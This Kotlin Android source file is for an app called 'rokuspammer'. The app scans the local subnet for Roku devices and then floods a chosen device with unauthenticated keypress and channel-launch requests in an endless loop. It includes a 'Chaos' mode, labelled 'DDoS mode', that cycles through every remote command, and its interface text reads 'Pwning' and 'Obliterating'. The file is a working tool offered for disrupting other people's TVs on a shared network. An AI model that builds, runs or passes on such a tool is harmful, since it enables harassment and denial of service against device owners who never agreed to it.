package com.example.rokuspammer

import android.os.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.*
import java.io.OutputStreamWriter
import java.net.*
import java.util.*
import android.view.View
import android.view.animation.AnimationUtils
import android.os.Vibrator
import android.os.VibrationEffect
import android.graphics.Color
import android.view.ViewGroup
import android.graphics.Typeface


class MainActivity : AppCompatActivity() {

    private lateinit var ipField: EditText
    private lateinit var scanButton: Button
    private lateinit var deviceSpinner: Spinner
    private lateinit var commandSpinner: Spinner
    private lateinit var delayInput: EditText
    private lateinit var startButton: Button
    private lateinit var stopButton: Button
    private lateinit var logOutput: TextView

    private var spamJob: Job? = null

    private val rokuCommands = listOf(
        "Chaos", // 💥 DDoS mode!
        "VolumeUp", "VolumeDown", "Home", "Back", "Select", "Info", "Up", "Down", "Left", "Right",
        "Launch Netflix", "Launch YouTube", "Launch Hulu", "Launch Disney+", "Launch Prime Video"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Link UI elements
        ipField = findViewById(R.id.ipField)
        scanButton = findViewById(R.id.scanButton)
        deviceSpinner = findViewById(R.id.deviceSpinner)
        commandSpinner = findViewById(R.id.commandSpinner)
        delayInput = findViewById(R.id.delayInput)
        startButton = findViewById(R.id.startButton)
        stopButton = findViewById(R.id.stopButton)
        logOutput = findViewById(R.id.logOutput)
        // ✅ Load last saved IP and show device name
        val sharedPref = getSharedPreferences("roku", MODE_PRIVATE)
        val lastIp = sharedPref.getString("lastIp", null)
        if (!lastIp.isNullOrBlank()) {
            ipField.setText(lastIp)
            fetchDeviceInfo(lastIp)
        }
        // Populate command spinner
        val adapter = ArrayAdapter(this, R.layout.spinner_item, rokuCommands)
        adapter.setDropDownViewResource(R.layout.spinner_dropdown_item)
        commandSpinner.adapter = adapter


        scanButton.setOnClickListener { scanForRokus() }

        startButton.setOnClickListener { startSpamming() }
        stopButton.setOnClickListener { stopSpamming() }
    }
    private fun fetchDeviceInfo(ip: String) {
        val url = "http://$ip:8060/query/device-info"
        Thread {
            try {
                val connection = URL(url).openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                val input = connection.inputStream.bufferedReader().use { it.readText() }

                val regex = Regex("<user-device-name>(.*?)</user-device-name>")
                val match = regex.find(input)
                val deviceName = match?.groupValues?.get(1) ?: "Roku"


            } catch (e: Exception) {
                runOnUiThread {
                    findViewById<TextView>(R.id.deviceInfoText).text = "Failed to fetch device info"
                }
            }
        }.start()
    }

    private fun getLocalSubnet(): String {
        val interfaces = NetworkInterface.getNetworkInterfaces()
        for (iface in interfaces) {
            for (addr in iface.inetAddresses) {
                if (!addr.isLoopbackAddress && addr is Inet4Address) {
                    val ip = addr.hostAddress
                    val subnet = ip.substringBeforeLast(".")
                    return subnet
                }
            }
        }
        return "192.168.0" // fallback
    }

    private fun scanForRokus() {
        val subnet = getLocalSubnet()
        val foundDevices = mutableMapOf<String, String>() // IP → Name


        log("Scanning $subnet.0/24...")

        CoroutineScope(Dispatchers.IO).launch {
            val jobs = (1..254).map { i ->
                async {
                    val ip = "$subnet.$i"
                    try {
                        val url = URL("http://$ip:8060/query/device-info")
                        val conn = url.openConnection() as HttpURLConnection
                        conn.connectTimeout = 300
                        conn.readTimeout = 300
                        conn.requestMethod = "GET"
                        if (conn.responseCode == 200) {
                            val xml = conn.inputStream.bufferedReader().use { it.readText() }
                            val name = Regex("<user-device-name>(.*?)</user-device-name>")
                                .find(xml)?.groupValues?.get(1) ?: "Roku"
                            foundDevices[ip] = name
                            log("Roku found: $name ($ip)")
                        }

                        conn.disconnect()
                    } catch (_: Exception) { }
                }
            }
            jobs.awaitAll()

            withContext(Dispatchers.Main) {
                if (foundDevices.isEmpty()) {
                    log("No Roku devices found.")
                } else {
                    val displayList = foundDevices.map { (ip, name) -> "$name ($ip)" }

                    val adapter = object : ArrayAdapter<String>(
                        this@MainActivity,
                        R.layout.spinner_item,
                        displayList
                    ) {
                        override fun getView(position: Int, convertView: View?, parent: ViewGroup): View {
                            val view = super.getView(position, convertView, parent) as TextView
                            view.setTextColor(Color.parseColor("#00FF00"))
                            view.setBackgroundColor(Color.BLACK)
                            view.textAlignment = View.TEXT_ALIGNMENT_CENTER
                            view.typeface = Typeface.MONOSPACE
                            return view
                        }

                        override fun getDropDownView(position: Int, convertView: View?, parent: ViewGroup): View {
                            val view = super.getDropDownView(position, convertView, parent) as TextView
                            view.setTextColor(Color.parseColor("#00FF00"))
                            view.setBackgroundColor(Color.parseColor("#222222"))
                            view.textAlignment = View.TEXT_ALIGNMENT_CENTER
                            view.typeface = Typeface.MONOSPACE
                            return view
                        }
                    }

                    deviceSpinner.adapter = adapter
                    deviceSpinner.setSelection(0) // ✅ Auto-select the first detected Roku

// ✅ Save to SharedPreferences
                    val firstIp = foundDevices.keys.firstOrNull()
                    if (firstIp != null) {
                        val sharedPref = getSharedPreferences("roku", MODE_PRIVATE)
                        sharedPref.edit().putString("lastIp", firstIp).apply()
                    }


                }
            }
        }
    }

    private fun startSpamming() {
        val targetIp = if (deviceSpinner.selectedItem != null) {
            val selected = deviceSpinner.selectedItem.toString()
            // Extract IP from "Name (IP)"
            Regex("\\((.*?)\\)").find(selected)?.groupValues?.get(1) ?: selected
        } else {
            ipField.text.toString()
        }

        // ✅ Now that targetIp exists, fetch the device info
        fetchDeviceInfo(targetIp)

        if (targetIp.isBlank()) {
            Toast.makeText(this, "Please enter or select a Roku IP", Toast.LENGTH_SHORT).show()
            return
        }

        val command = commandSpinner.selectedItem.toString()
        val delay = delayInput.text.toString().toLongOrNull() ?: 300L
        runOnUiThread {
            val selectedDisplay = deviceSpinner.selectedItem?.toString() ?: ipField.text.toString()
            val deviceName = Regex("^(.*?) \\(").find(selectedDisplay)?.groupValues?.get(1) ?: "Roku"

            val text = if (command == "Chaos") {
                "Obliterating: $deviceName"
            } else {
                "Pwning: $deviceName"
            }

            findViewById<TextView>(R.id.deviceInfoText).text = text
        }


        spamJob = CoroutineScope(Dispatchers.IO).launch {
            runOnUiThread {
                val anim = AnimationUtils.loadAnimation(this@MainActivity, R.anim.glitch)
                startButton.startAnimation(anim)
                startButton.text = "⚠️ CHAOS MODE ACTIVE"
                val vibrator = getSystemService(VIBRATOR_SERVICE) as Vibrator
                val pattern = longArrayOf(0, 100, 100) // wait, vibrate, pause
                val effect = VibrationEffect.createWaveform(pattern, 0)
                vibrator.vibrate(effect)
            }

            while (isActive) {
                try {
                    if (command == "Chaos") {
                        for (cmd in rokuCommands.drop(1)) { // Skip "Chaos"
                            val url = URL("http://$targetIp:8060/keypress/$cmd")
                            val conn = url.openConnection() as HttpURLConnection
                            conn.requestMethod = "POST"
                            conn.connectTimeout = 500
                            conn.readTimeout = 500
                            conn.doOutput = true
                            OutputStreamWriter(conn.outputStream).use { it.write("") }
                            conn.responseCode
                            conn.disconnect()
                            log("Chaos: Sent $cmd to $targetIp")
                            delay(150)
                        }
                    } else {
                        val url = if (command.startsWith("Launch")) {
                            val channelId = when (command) {
                                "Launch Netflix" -> "12"
                                "Launch YouTube" -> "837"
                                "Launch Hulu" -> "2285"
                                "Launch Disney+" -> "291097"
                                "Launch Prime Video" -> "13"
                                else -> null
                            }
                            URL("http://$targetIp:8060/launch/$channelId")
                        } else {
                            URL("http://$targetIp:8060/keypress/$command")
                        }

                        val conn = url.openConnection() as HttpURLConnection
                        conn.requestMethod = "POST"
                        conn.connectTimeout = 500
                        conn.readTimeout = 500
                        conn.doOutput = true
                        OutputStreamWriter(conn.outputStream).use { it.write("") }
                        conn.responseCode
                        conn.disconnect()
                        log("Sent $command to $targetIp")
                        delay(delay)
                    }
                } catch (e: Exception) {
                    log("Error sending: ${e.message}")
                    delay(500)
                }
            }
        }
    }

    private fun stopSpamming() {
        runOnUiThread {
            startButton.clearAnimation()
            startButton.text = "START PWNING"
            findViewById<TextView>(R.id.deviceInfoText).text = "Idle"
            val vibrator = getSystemService(VIBRATOR_SERVICE) as Vibrator
            vibrator.cancel()
        }


        spamJob?.cancel()
        log("Stopped.")
    }

    private fun log(message: String) {
        runOnUiThread {
            val oldText = logOutput.text.toString()
            val newText = "$oldText\n$message"
            logOutput.text = newText

            val scrollView = findViewById<ScrollView>(R.id.logScroll)
            scrollView.post {
                scrollView.fullScroll(View.FOCUS_DOWN)
            }
        }
    }
    }